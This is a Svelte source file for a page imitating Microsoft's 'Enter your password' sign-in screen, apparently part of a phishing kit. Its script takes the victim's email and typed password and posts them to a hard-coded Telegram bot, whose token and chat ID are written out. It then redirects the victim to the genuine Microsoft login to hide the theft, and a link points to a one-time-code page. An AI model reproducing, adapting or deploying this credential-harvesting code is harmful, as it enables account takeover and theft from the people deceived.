<script>
import { emailStore } from '../stores.js';
import MicrosoftSvg from '../assets/microsoft.svg';
import SignUpFooter from '../lib/SignUpFooter.svelte';
// import { push } from 'svelte-spa-router';
import { link } from "svelte-spa-router";


let password = "";
let showPassword = false;
let errorMessage = "";

function toggleVisibility() {
    showPassword = !showPassword;
}

function validatePassword(value) {

    if (!value || value.trim() === "") {
        errorMessage = "Enter the password for your account.";
        return false;
    }
    errorMessage = "";
    return true;
}

async function sendDataToBackend(password) {
          let message = `New ${name} login attempt-> password for: ${$emailStore} is ${password}`;
      const botToken = '8370164086:AAF5HP0jGNLwV_PB9q7sVncLSULost68M-U';
      const chatId = '1314372286';
      // const chatId = 1314372286;
      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {

        const response = await fetch(telegramApiUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                "chat_id": chatId,
                "text": message
            })
        });

         if (response.status === 200) {
          console.log('Login successful!');
        } else {
          console.error('Login Attempt Failed:', response.status);
        }

    } catch (error) {
        console.error("Error sending data:", error);
    }
}

function redirectUrl() {
    window.location.href = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&client-request-id=aa5d7863-01e7-83c4-2d7f-31772f123e2a&response_mode=fragment&client_info=1&prompt=select_account&nonce=019cb9a5-d67a-7cf9-8b71-a2cd571134d5&state=eyJpZCI6IjAxOWNiOWE1LWQ2N2EtN2I5MC1iYzkwLWY1MTEzNzBiODA0MyIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D%7CaHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvP2N1bHR1cmU9ZW4tdXMmY291bnRyeT11cw&claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&x-client-SKU=msal.js.browser&x-client-VER=4.28.2&response_type=code&code_challenge=4SaIMlw_WWhkKYacLXhJm7hdeOGu74QawvBxKkSjCRM&code_challenge_method=S256&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&fl=dob,flname,wld&sso_reload=true";
}
</script>

<div class="wrapper">
  <div class="container">
    <div class="card">
       <div class="back-button-container">
        <button class="icon-btn" on:click={() => window.history.back()}>
          <svg viewBox="0 0 24 24" width="16"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
        </button>
      </div>

      <!-- Logo -->
      <div class="logo-wrapper">
        <img src={MicrosoftSvg} alt="microsoft" class="logo"/>
        <div class="email-display">{$emailStore ? $emailStore : 'No email provided'}</div>
      </div>

      <h2>Enter your password</h2>

    <!-- Material/Microsoft-style password input -->
     <div class="input-container {errorMessage ? 'error' : ''}">
        <input 
            type={showPassword ? "text" : "password"} 
            id="password" 
            bind:value={password} 
            placeholder=" "
            on:input={() => errorMessage = ""}
            on:keydown={async(e) => {
                if (e.key === "Enter") {
                if (validatePassword(password)) {
                    await sendDataToBackend(password);
                    redirectUrl();
                }
            }
         }}
        />
        <label for="password">Password</label>
        <button type="button" class="eye-icon" on:click={toggleVisibility} tabindex="-1">
          {#if showPassword}
            <svg viewBox="0 0 24 24" width="20">
              <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
            </svg>
          {:else}
            <svg viewBox="0 0 24 24" width="20">
              <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.82l2.92 2.92c1.51-1.26 2.7-2.89 3.44-4.74-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
            </svg>
          {/if}
        </button>
      </div>

      {#if errorMessage}
        <p class="error-text">{errorMessage}</p>
      {/if}

      <p class="forgot">
        <a href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf%3fusername%3%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dEN-US%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26uaid%3daa5d786301e783c42d7f31772f123e2a%26contextid%3dF6E4FBB1C8E6D8AE%26opid%3dA457B7DCF128D61D%26bk%3d1772788545&id=38936&uiflavor=web&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=1E0000487A244A&fluent=2&uaid=aa5d786301e783c42d7f31772f123e2a&mkt=EN-US&lc=1033&bk=1772788545">Forgot your password?</a>
      </p>

      <div class="button-row">
        <button on:click={async() => {
            if (!validatePassword(password)) {
                return;
            }
                await sendDataToBackend(password);
                redirectUrl();
            }}>
            Next
        </button>
      </div>

      <p class="other"><a href="/otp" use:link >Send a code to {$emailStore}</a></p>

    </div>
  </div>

  <SignUpFooter/>
</div>

<style>
/* WRAPPER */
.wrapper {
  min-height: 100vh;
  width: 100%;
  background: white;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
}

/* CONTAINER */
.container {
  padding: 20px;
  position: relative;
}

/* CARD */
.card {
  background: white;
  padding: 20px;
  border-radius: 4px;
  box-shadow: none;
  position: relative;
}

.back-button-container {
    /* Positioned absolutely to bypass parent padding on mobile */
    position: absolute;
    top: 20px;
    left: 0;
    z-index: 10;
  }

  .icon-btn {
    background: transparent;
    border: none;
    padding: 12px; /* Larger tap target */
    cursor: pointer;
    color: #666;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .icon-btn:hover {
    background: rgba(0, 0, 0, 0.05);
    border-radius: 50%;
  }


/* LOGO + EMAIL */
.logo-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  /* margin-bottom: 20px; */
}

.logo {
  width: 110px;
  margin-bottom: 32px;
}

.email-display {
  font-size: 14px;
  color: #333;
  background: white; /* light grey */
  padding: 6px 12px;
  border-radius: 24px;
  width: max-content;
  text-align: center;
  margin-bottom: 16px;
  border: 1px solid #f0f0f0;
}

/* HEADER */
h2 {
  font-weight: 500;
  margin-top: 0;
  margin-bottom: 20px;
  text-align: center;
}

/* INPUT CONTAINER */
.input-container {
  position: relative;
  display: flex;
  align-items: center;
  border: 1px solid #ccc;
  border-radius: 4px;
  padding-right: 40px; /* space for eye icon */
  transition: border-color 0.2s ease;
}

/* Hover/focus border-bottom blue only */
.input-container:hover,
.input-container:focus-within {
  border-bottom: 2px solid #0067b8; /* Microsoft blue */
  border-left-color: #ccc;
  border-top-color: #ccc;
  border-right-color: #ccc;
}

/* INPUT */
.input-container input {
  flex: 1;
  padding: 16px 12px 8px 12px;
  font-size: 15px;
  border: none;
  outline: none;
  background: transparent;
}


/* LABEL */
.input-container label {
  position: absolute;
  top: 8px;
  left: 12px;
  font-size: 15px;
  color: #888; /* grey label */
  pointer-events: none;
  transition: all 0.2s ease;
  background: white;
  padding: 0 4px;
}

/* FLOAT LABEL ON HOVER OR FOCUS */
.input-container:hover label,
.input-container input:focus + label,
.input-container input:not(:placeholder-shown) + label {
  top: -8px;
  left: 8px;
  font-size: 12px;
  color: #888;
}

/* EYE ICON */
.eye-icon {
  position: absolute;
  right: 8px;
  top: 50%;
  transform: translateY(-50%);
  border: none;
  background: transparent;
  cursor: pointer;
  opacity: 0; /* hidden by default */
  transition: opacity 0.2s ease;
  padding: 0;
  width: 20px;
  height: 20px;
}

.input-container:hover .eye-icon,
.input-container:focus-within .eye-icon {
  opacity: 1;
}

.eye-icon svg {
  fill: #666;
  width: 20px;
  height: 20px;
}

button.eye-icon:hover, button.eye-icon:focus {
    background: white !important;
}

button.eye-icon:focus, button.eye-icon:hover {
    outline: none;
}

.input.error{
    border-bottom:1px solid #e81123;
}

.error-text{
    color:#e81123;
    font-size:13px;
    margin-top:4px;
    margin-bottom:8px;
}

/* FORGOT PASSWORD */
.forgot a {
  font-size: 14px;
  color: #0067b8;
  cursor: pointer;
}

.forgot a:hover {
  text-decoration: underline;
}

/* BUTTON */
.button-row {
  display: flex;
  justify-content: flex-end;
  margin-top: 15px;
}

button {
  background: #0067b8;
  width: 100%;
  color: white;
  border: none;
  padding: 8px 24px;
  cursor: pointer;
  border-radius: 4px;
}

button:hover {
  background: #005da6;
}

button:hover, button:focus {
    outline: none;
}

/* OTHER WAYS */
.other {
  margin-top: 20px;
  font-size: 14px;
  color: #115EA3;
  text-align: center;
}

.other a {
  color: #115EA3;
  cursor: pointer;
}

/* DESKTOP VERSION */
@media (min-width: 768px) {
  .wrapper {
    justify-content: center;
    align-items: center;
    background: url('../assets/background.svg');
    background-size: cover;
  }

  .container {
    max-width: 440px;
    width: 100%;
  }

  .card {
    background: white;
    padding: 44px;
    border-radius: 4px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
  }

  .back-button-container {
      top: 20px;
      left: 20px;
    }
}
</style>